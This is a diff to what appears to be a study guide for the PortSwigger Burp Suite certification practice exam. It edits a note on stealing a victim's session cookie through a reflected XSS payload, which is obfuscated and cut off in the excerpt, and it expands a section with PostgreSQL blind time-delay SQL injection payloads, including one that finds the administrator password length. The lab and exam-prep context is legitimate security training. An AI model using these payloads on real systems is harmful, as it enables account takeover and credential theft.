@@ -656,7 +656,7 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
->**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move on to [Stage 2 of the Practice Exam](#sqlmap).  
+>**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move on to [Stage 2 of the Practice Exam](#blind-time-delay).  
 
 [PortSwigger Practice Exam - Stage 1 - Foothold](https://portswigger.net/web-security/certification/takepracticeexam/index.html)  
   
@@ -1567,17 +1567,21 @@ csrf=TOKEN&username=administrator
 
 >Blind SQL injection with time delays is tricky to ***identify***, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection ***identified***. 
 
->Identify SQLi vulnerability.  
+>Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`, but `SQLMAP` no longer since March 2023 able to identify and exploit the vulnerability.   
 
 ```SQL
 ;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
+```
 
+>[URL encoded](https://www.urlencoder.org/) `PostgreSQL` payload.  
+
+```SQL
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 ```  
 
->Determine how many characters are in the password of the administrator user. To do this, change the value to:  
+>Determine how many characters are in the password of the administrator user. To do this, increment the number after ` >1 ` conditional check.  
 
-```sql
+```SQL
 ;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```
 
